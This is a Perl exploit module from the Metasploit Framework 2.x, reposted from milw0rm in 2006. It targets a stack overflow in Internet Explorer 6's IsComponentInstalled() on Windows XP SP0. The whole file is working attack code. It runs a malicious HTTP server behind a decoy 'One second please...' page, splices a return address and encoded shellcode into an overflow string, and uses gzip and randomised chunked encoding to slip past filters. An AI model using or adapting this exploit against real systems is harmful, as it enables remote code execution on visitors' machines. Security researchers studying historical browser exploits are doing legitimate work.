##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_iscomponentinstalled;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

my $advanced =
  {
	'Gzip'       => [1, 'Enable gzip content encoding'],
	'Chunked'    => [1, 'Enable chunked transfer encoding'],
  };
  
my $info =
  {
	'Name'           => 'Windows XP SP0 IE 6.0 IsComponentInstalled() Overflow',
	'Version'        => '$Revision: 1.2 $',
	'Authors'        =>
	  [
		'H D Moore <hdm [at] metasploit.com>',
	  ],

	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a stack overflow in Internet Explorer. This bug was
		patched in Windows 2000 SP4 and Windows XP SP1 according to MSRC.
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32' ],
	'Priv'           => 0,

	'AutoOpts'       => { 'EXITFUNC' => 'thread' },
	'UserOpts'       =>
	  {
		'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
	  },

	'Payload'        =>
	  {
		'Prepend'    => "\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff",	  
		'Space'      => 512,
		'BadChars'   => "\x00\x5c\x0a\x0d\x22",
		'Keys'     => ['-bind'],
	  },
	'Refs'           =>
	  [
	  ],

	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
		[ 'Windows XP SP0 with Internet Explorer 6.0', 0x71aa16e5 ]
	  ],
	
	'Keys'           => [ 'ie' ],

	'DisclosureDate' => 'Feb 24 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('HTTPHOST'),
		LocalPort => $self->GetVar('HTTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp'
	);
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	my $httphost = ($self->GetVar('HTTPHOST') eq '0.0.0.0') ?
		Pex::Utils::SourceIP('1.2.3.4') :
		$self->GetVar('HTTPHOST');

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar('HTTPPORT') ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);
		

	# Read the HTTP command
	my ($cmd, $url, $proto) = split(/ /, $fd->RecvLine(10), 3);
	my $agent;
	
	# Read in the HTTP headers
	while ((my $line = $fd->RecvLine(10))) {
		
		$line =~ s/^\s+|\s+$//g;
		
		my ($var, $val) = split(/\:/, $line, 2);

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		$agent = $val if $var =~ /User-Agent/i;
	}
	
	$self->PrintLine("[*] Client connected from $rhost:$rport ($agent)");

	my $res = $fd->Send($self->BuildResponse($self->GenerateHTML()));

	$fd->Close();
}

sub GenerateHTML {
	my $self        = shift;
	my $target      = $self->Targets->[$self->GetVar('TARGET')];
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $pattern     = Pex::Text::AlphaNumText(8192);
	
	substr($pattern, 755, 4, pack('V',  $target->[1] ));
	substr($pattern, 755 + 2888, length($shellcode), $shellcode);

	my $data        = qq|
<html>
<head>
	<title>One second please...</title>
	<script>
		function window.onload() {
			oClientCaps.style.behavior = "url(#default#clientCaps)";
			oClientCaps.isComponentInstalled("$pattern", "componentid");
		}
	</script>
</head>
<body id="oClientCaps">
One second please...
</body>
</html>
|;
	return $data;
}

sub BuildResponse {
	my ($self, $content) = @_;

	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  "Content-Type: text/html\r\n";

	if ($self->GetVar('Gzip')) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar('Chunked')) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= 'Content-Length: ' . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), '');
		$chunked .= sprintf('%x', length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, 'gzip', '-'.$comp, '-c', '--force');
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}
1;


# milw0rm.com [2006-02-28]
